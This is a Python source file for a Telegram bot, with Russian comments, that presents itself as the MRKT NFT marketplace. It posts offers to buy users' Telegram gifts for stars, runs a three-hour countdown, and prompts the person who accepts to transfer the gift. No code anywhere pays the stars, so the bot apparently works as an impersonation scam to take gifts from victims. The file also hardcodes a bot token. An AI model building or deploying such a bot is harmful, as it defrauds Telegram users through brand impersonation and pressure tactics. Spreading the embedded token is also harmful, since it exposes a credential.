import asyncio
import html
import logging
import re
import uuid
from collections import OrderedDict

from aiogram import Bot, Dispatcher, F, types
from aiogram.enums import ChatType
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command
from aiogram.types import (
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)

# Вставьте сюда токен от @BotFather
TOKEN = "9054045234:AAGRXS1KsFt4F1sGrk5l_EjHA6_NIluCNTQ"

# Длительность таймера в минутах (180 минут = 3 часа)
OFFER_DURATION_MINUTES = 180

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()

GIFT_RE = re.compile(r"^https://t\.me/(nft|gift)/[\w-]+$")

processed_offers: OrderedDict[str, bool] = OrderedDict()
MAX_CACHE = 10_000

# Задачи-таймеры держим здесь, чтобы loop не съел их и не было утечек
running_timers: set[asyncio.Task] = set()

# Кэш имени бота (заполняется при старте)
BOT_USERNAME: str = ""


def mark_processed(uid: str) -> None:
    processed_offers[uid] = True
    if len(processed_offers) > MAX_CACHE:
        processed_offers.popitem(last=False)


def get_offer_kb(sender_id: int, gift_link: str) -> InlineKeyboardMarkup:
    # Хвост ссылки ("/nft/PlushPepe-1") кладём в callback_data,
    # чтобы потом восстановить полную ссылку без БД.
    gift_slug = gift_link[len("https://t.me"):]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="✅ Принять",
                callback_data=f"acc|{sender_id}|{gift_slug}",
            ),
            InlineKeyboardButton(
                text="❌ Отклонить",
                callback_data=f"dec|{sender_id}|{gift_slug}",
            ),
        ]
    ])


def get_accepted_kb(gift_link: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="🎁 Открыть NFT для передачи",
                url=gift_link,
            )
        ]
    ])


def format_offer_text(stars: str, gift_link: str) -> str:
    safe_link = html.escape(gift_link, quote=True)
    return (
        f"🎁 <b>Предложение об обмене</b>\n\n"
        f"Готовы ли вы продать <a href='{safe_link}'>этот подарок</a> "
        f"за <b>{stars} ⭐️</b>?"
    )


def is_valid_offer(stars: str, link: str) -> bool:
    return (
        stars.isdigit()
        and (1 <= int(stars) <= 1_000_000)
        and bool(GIFT_RE.match(link))
    )


def format_timer_text(buyer_mention: str, minutes_left: int) -> str:
    hours = minutes_left // 60
    mins = minutes_left % 60
    return (
        f"✅ <b>Оффер принят пользователем {buyer_mention}!</b>\n\n"
        f"⏳ <b>Ждём отправки подарка...</b>\n"
        f"⏱ Осталось времени: <b>{hours} ч. {mins:02d} мин.</b>\n\n"
        f"<i>Нажмите кнопку ниже, чтобы открыть страницу подарка "
        f"и передать его:</i>"
    )


async def run_offer_timer(
    buyer_mention: str,
    accepted_kb: InlineKeyboardMarkup,
    inline_message_id: str | None = None,
    chat_id: int | None = None,
    message_id: int | None = None,
) -> None:
    for minutes_left in range(OFFER_DURATION_MINUTES - 1, -1, -1):
        await asyncio.sleep(60)

        if minutes_left > 0:
            text = format_timer_text(buyer_mention, minutes_left)
            kb = accepted_kb
        else:
            text = "❌ <b>Оффер недоступен.</b>"
            kb = None

        try:
            if inline_message_id:
                await bot.edit_message_text(
                    inline_message_id=inline_message_id,
                    text=text,
                    reply_markup=kb,
                    parse_mode="HTML",
                )
            elif chat_id and message_id:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=text,
                    reply_markup=kb,
                    parse_mode="HTML",
                )
        except TelegramBadRequest:
            # Сообщение удалено / старше 48ч / уже истекло — выходим.
            break


def spawn_timer(coro) -> None:
    task = asyncio.create_task(coro)
    running_timers.add(task)
    task.add_done_callback(running_timers.discard)


# --- КОМАНДА /start (только в ЛС) ---
@dp.message(Command("start"), F.chat.type == ChatType.PRIVATE)
async def cmd_start(message: types.Message):
    start_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Откройте MRKT", url="https://t.me/mrkt/app")],
        [
            InlineKeyboardButton(
                text="Вступайте в сообщество MRKT",
                url="https://t.me/official_mrkt",
            )
        ],
    ])
    await message.answer(
        "Добро пожаловать в MRKT — крупнейший NFT-маркетплейс.\n"
        "Начните торговать уже сегодня.",
        reply_markup=start_kb,
    )


# --- ИНЛАЙН-РЕЖИМ (@имя_бота 500 https://t.me/nft/...) ---
@dp.inline_query()
async def inline_offer_handler(inline_query: InlineQuery):
    parts = inline_query.query.strip().split(maxsplit=1)

    if len(parts) < 2 or not is_valid_offer(parts[0], parts[1]):
        hint = InlineQueryResultArticle(
            id="hint",
            title="Создать оффер",
            description="Формат: 500 https://t.me/nft/PlushPepe-1",
            input_message_content=InputTextMessageContent(
                message_text=(
                    f"⚠️ Используйте формат: "
                    f"`@{BOT_USERNAME} 500 https://t.me/nft/PlushPepe-1`"
                ),
                parse_mode="Markdown",
            ),
        )
        await inline_query.answer([hint], cache_time=1)
        return

    stars = parts[0]
    gift_link = parts[1]
    sender = inline_query.from_user

    article = InlineQueryResultArticle(
        id=uuid.uuid4().hex,
        title=f"Отправить оффер за {stars} ⭐️",
        description=gift_link,
        input_message_content=InputTextMessageContent(
            message_text=format_offer_text(stars, gift_link),
            parse_mode="HTML",
        ),
        reply_markup=get_offer_kb(sender.id, gift_link),
    )
    await inline_query.answer([article], cache_time=1)


# --- КОМАНДА /offer В ГРУППЕ ---
@dp.message(Command("offer"))
async def group_offer_handler(message: types.Message):
    parts = (message.text or "").split(maxsplit=2)

    if len(parts) < 3 or not is_valid_offer(parts[1], parts[2]):
        warn = await message.answer(
            "⚠️ Формат: `/offer 500 https://t.me/nft/PlushPepe-1`",
            parse_mode="Markdown",
        )
        await asyncio.sleep(5)
        for msg in (warn, message):
            try:
                await msg.delete()
            except Exception:
                pass
        return

    try:
        await message.delete()
    except Exception:
        pass

    stars = parts[1]
    gift_link = parts[2]
    sender = message.from_user
    await message.answer(
        text=format_offer_text(stars, gift_link),
        reply_markup=get_offer_kb(sender.id, gift_link),
        parse_mode="HTML",
    )


# --- ОБРАБОТКА КНОПОК ПРИНЯТЬ / ОТКЛОНИТЬ ---
@dp.callback_query(F.data.startswith(("acc|", "dec|")))
async def process_offer_buttons(callback: CallbackQuery):
    try:
        action, sender_id_str, gift_slug = callback.data.split("|", maxsplit=2)
        sender_id = int(sender_id_str)
    except ValueError:
        await callback.answer("Ошибка данных оффера.", show_alert=True)
        return

    if callback.from_user.id == sender_id:
        await callback.answer(
            "Вы не можете ответить на свой оффер!", show_alert=True
        )
        return

    if callback.inline_message_id:
        msg_uid = callback.inline_message_id
    elif callback.message:
        msg_uid = f"{callback.message.chat.id}_{callback.message.message_id}"
    else:
        await callback.answer("Оффер больше неактуален.", show_alert=True)
        return

    if msg_uid in processed_offers:
        await callback.answer("На этот оффер уже ответили!", show_alert=True)
        return
    mark_processed(msg_uid)

    buyer = callback.from_user.mention_html()
    exact_gift_link = f"https://t.me{gift_slug}"

    if action == "dec":
        new_text = "❌ <b>Предложение отклонено.</b>"
        alert_text = "Оффер отклонён"
        reply_kb = None
    else:
        new_text = format_timer_text(buyer, OFFER_DURATION_MINUTES)
        alert_text = "Вы приняли предложение! У вас есть 3 часа."
        reply_kb = get_accepted_kb(exact_gift_link)

    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=new_text,
                reply_markup=reply_kb,
                parse_mode="HTML",
            )
            if action == "acc":
                spawn_timer(
                    run_offer_timer(
                        buyer_mention=buyer,
                        accepted_kb=reply_kb,
                        inline_message_id=callback.inline_message_id,
                    )
                )
        elif callback.message:
            await callback.message.edit_text(
                text=new_text,
                reply_markup=reply_kb,
                parse_mode="HTML",
            )
            if action == "acc":
                spawn_timer(
                    run_offer_timer(
                        buyer_mention=buyer,
                        accepted_kb=reply_kb,
                        chat_id=callback.message.chat.id,
                        message_id=callback.message.message_id,
                    )
                )
    except TelegramBadRequest:
        pass

    await callback.answer(alert_text)


async def main():
    global BOT_USERNAME
    await bot.delete_webhook(drop_pending_updates=True)
    me = await bot.get_me()
    BOT_USERNAME = me.username or ""
    logging.info("Bot started as @%s", BOT_USERNAME)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())